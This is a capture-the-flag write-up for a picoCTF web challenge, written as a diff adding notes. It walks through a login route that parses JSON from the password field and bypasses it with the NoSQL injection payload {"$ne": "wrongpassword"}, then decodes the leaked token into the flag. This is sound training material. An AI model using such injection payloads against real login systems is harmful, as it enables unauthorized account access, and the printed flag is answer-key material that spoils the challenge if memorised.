@@ -1,0 +1,99 @@
+$ curl -sO https://artifacts.picoctf.net/c_atlas/29/app.tar.gz
+$ tar xzvf app.tar.gz
+$ cd app
+
+---
+Live url for flag: http://atlas.picoctf.net:61553/
+It opens up with a login page.
+
+---
+
+Browse through the code and find the file that processes the post request.
+
+Here are the relevant files found:
+
+1. 
+
+api/login/routes.ts
+
+It shows, that user name and password can expect a json string which will be converted to json object for 
+querying the database.
+
+```
+const users = await User.find({
+  email: email.startsWith("{") && email.endsWith("}") ? JSON.parse(email) : email,
+  password: password.startsWith("{") && password.endsWith("}") ? JSON.parse(password) : password
+});
+
+```
+
+2. 
+utils/seed.ts
+
+Email to use for login: joshiriya355@mumbama.com
+
+```
+const newUser = new User({
+  firstName: "Josh",
+  lastName: "Iriya",
+  email: "joshiriya355@mumbama.com",
+  password: process.env.NEXT_PUBLIC_PASSWORD as string
+});
+
+```
+
+3. 
+model/user.ts
+
+Shows that `token` fields contains the flag
+
+```
+const UserSchema: Schema = new Schema({
+  email: { type: String, required: true, unique: true },
+  firstName: { type: String, required: true },
+  lastName: { type: String, required: true },
+  password: { type: String, required: true },
+  token: { type: String, required: false ,default: "{{Flag}}"},
+});
+
+```
+
+----
+
+Researching for NoSql injection : https://portswigger.net/web-security/nosql-injection
+
+I got the hint from first syntax: 
+` {"username": "admin", "password": {"$ne": "wrong-password"}} `
+
+So I tried these credentials (while devtools opened):
+
+email: joshiriya355@mumbama.com
+password: {"$ne": "wrongpassword"}
+
+And it worked.
+
+---
+
+Check the response in the Networks tab:
+
+[
+  {
+    "_id": "65f08d5715535af6a1394524",
+    "email": "joshiriya355@mumbama.com",
+    "firstName": "Josh",
+    "lastName": "Iriya",
+    "password": "Je80T8M7sUA",
+    "token": "cGljb0NURntqQmhEMnk3WG9OelB2XzFZeFM5RXc1cUwwdUk2cGFzcWxfaW5qZWN0aW9uX2UzMWVmMzI0fQ==",
+    "__v": 0
+  }
+]
+
+
+
+---
+Decode the token
+
+$ echo 'cGljb0NURntqQmhEMnk3WG9OelB2XzFZeFM5RXc1cUwwdUk2cGFzcWxfaW5qZWN0aW9uX2UzMWVmMzI0fQ==' | base64 -d
+
+> picoCTF{jBhD2y7XoNzPv_1YxS9Ew5qL0uI6pasql_injection_e31ef324}
+
